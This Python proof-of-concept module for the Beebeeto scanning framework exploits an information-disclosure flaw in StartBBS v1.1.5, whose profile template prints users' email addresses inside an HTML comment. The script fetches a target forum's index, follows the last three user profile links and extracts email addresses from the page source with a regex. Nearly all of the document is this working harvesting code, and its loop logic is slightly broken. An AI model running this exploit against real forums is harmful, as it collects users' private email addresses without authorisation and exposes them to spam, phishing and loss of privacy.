#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0192',
            'name': 'StartBBS v1.1.5 有趣的泄露任意用户邮箱漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-12-10',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'StartBBS',
            'vul_version': ['1.1.5'],
            'type': 'Information Disclosure',
            'tag': ['StartBBS信息泄露', '有趣的泄露任意用户邮箱漏洞', 'php'],
            'desc': '''
                    代码 /themes/default/userinfo.php在第86行有这样一句：
                        <div class='inner'><p><?php echo $introduction?></p><!--<p>
                        联系方式: <a href="mailto:<?php echo $email?>" class="external mail">
                        <?php echo $email?></a></p>--></div>

                    输出了用户的邮箱，但是给注释掉了，所以用户页面看不到。。查看源代码即可
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-051696',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        # GET User
        url = args['options']['target']
        index_content = urllib2.urlopen(url).read()
        regex_user = re.compile(r'(/user/info/\d+)" class="dark startbbs profile_link"', re.IGNORECASE)
        regex_mail = re.compile(r"\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}\b", re.IGNORECASE)
        user_list = regex_user.findall(index_content)
        # Main
        if user_list:
            user_url = []
            args['poc_ret']['user_email'] = []
            # GET User homepage
            for i in user_list[-3:]:
                url_tmp = url + i
                user_url.append(url_tmp)
            # GET Email
            for i in user_url:
                if args['options']['verbose']:
                    print '[*] Request URL: ' + i
                try:
                    content = urllib2.urlopen(i).read()
                except:
                    continue
                mail_list = regex_mail.findall(content)
            # Success or False
            if mail_list:
                for mail in mail_list:
                    args['success'] = True
                    args['options']['target'] = user_url
                    args['poc_ret']['user_email'].append(mail)
            if not args['poc_ret']['user_email']:
                args['success'] = False
                args['poc_ret'].pop('user_email')
            return args
        else:
            args['success'] = False
            return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())